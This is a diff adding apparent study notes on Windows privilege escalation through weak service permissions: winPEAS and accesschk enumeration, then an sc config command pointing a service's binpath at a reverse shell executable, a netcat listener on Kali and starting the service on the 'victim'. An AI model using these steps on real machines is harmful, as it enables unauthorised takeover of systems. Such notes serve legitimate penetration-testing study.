@@ -69,9 +69,34 @@ sc.exe config <name> <option>= <value>
 Start/Stop a service:
 net start/strop <name>
 
+                                                                   insecure service permissions
+to enumerate insecure service permissions with winpeas use this command:
+winPeasany.exe quiet servicesinfo 
 
+if there is a service winpeas says is modifyable we can check with accesschk.exe:
+accesschk.exe /accepteula -uwcqv <username> <service>
 
+make sure you see this output come from the above command:
+SERVICE_CHANGE_CONFIG
+SERVICE_START
+SERVICE_STOP
 
+next query the services configuration to get some details:
+sc qc daclsvc
+
+check the current state of the service:
+sc query daclsvc
+
+change the path of the service to where our reverse shell payload is stored:
+sc config <service> binpath= "\"C:\PrivEsc\reverse.exe\""
+
+start a listner in kali"
+nc -nlvp 1337
+
+start the service on the victim machine 
+net start <service>
+
+DONE PRIVESC
 
 
 
